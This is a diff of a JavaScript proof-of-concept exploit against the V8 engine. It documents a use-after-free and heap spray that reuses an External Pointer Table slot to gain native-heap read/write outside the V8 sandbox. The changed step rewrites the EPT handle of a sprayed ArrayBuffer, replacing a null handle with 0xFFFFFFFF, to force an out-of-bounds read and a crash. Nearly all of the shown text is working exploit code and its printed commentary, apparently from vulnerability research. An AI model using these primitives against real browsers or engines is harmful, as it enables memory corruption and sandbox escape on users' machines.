@@ -239,21 +239,19 @@ print('          then free victim → spray spies → spy reuses EPT slot');
 print('          now attacker.DataView → spy\'s backing_store (native C++ heap)');
 print('  Result: arbitrary read/write to native heap outside V8 sandbox isolation\n');
 
-// ── STEP 9: SIGSEGV — null backing_store via EPT[0] ──────────────────────────────────────
-banner('STEP 9 — SIGSEGV: Null backing_store via EPT[0]');
-// V8 ExternalPointerTable convention:
-//   EPT[0] = null sentinel (0x0 at startup, reserved, never used for real entries)
-//   handle = 0x00000000 → index = 0 → backing_store = EPT[0] & ~tag_mask = 0x0
-//   DataView access → dereference 0x0 → SIGSEGV (not SIGBUS — truly unmapped addr)
-//
-// Release build: no tag check, just AND: entry & ~kExternalPointerTagMask = 0 & ~mask = 0
+// ── STEP 9: SIGSEGV — OOB EPT handle (past table end) ────────────────────────
+banner('STEP 9 — SIGSEGV: OOB EPT handle → unmapped read');
+// EPT table capacity (after growing for 1502 entries) ≈ 2048 entries = 16KB.
+// handle = 0xFFFFFFFF → index = 0xFFFFFFFF >> 6 = 0x3FFFFFF = 67M
+// EPT_base + 67M * 8 = EPT_base + 537MB → 537MB past end of 16KB table
+// EPT is a native OS allocation (outside sandbox VA) → SIGSEGV on OOB read.
 
-let orig_h = r32(spy0_sb + BigInt(AB_EPT_OFF));
-print('  spy[0] ept_handle = ' + hex(orig_h) + '  idx=' + (BigInt(orig_h)>>6n) + '  (legitimate slot)');
-print('  overwriting spy[0].ept_handle = 0x00000000 → EPT[0] = null sentinel');
-w32(spy0_sb + BigInt(AB_EPT_OFF), 0x00000000);
+let orig_h2 = r32(spy0_sb + BigInt(AB_EPT_OFF));
+print('  spy[0] ept_handle = ' + hex(orig_h2) + '  (legitimate)');
+print('  overwriting with 0xFFFFFFFF → EPT index = 0x3FFFFFF (67M entries OOB)');
+w32(spy0_sb + BigInt(AB_EPT_OFF), 0xFFFFFFFF);
 print('  accessing spy[0][0]...');
-print('  → EPT lookup: index=0 → entry=0x0 → backing_store=0x0');
-print('  → dereference 0x0 → SIGSEGV\n');
-let sigsegv_val = new DataView(spies[0]).getUint32(0, true);
-print('  value = ' + hex(sigsegv_val)); // never reached
+print('  → EPT table is ~16KB; index 67M → reads EPT_base + 537MB');
+print('  → 537MB past EPT allocation → unmapped VA → SIGSEGV\n');
+let sigsegv_val2 = new DataView(spies[0]).getUint32(0, true);
+print('  value = ' + hex(sigsegv_val2)); // never reached
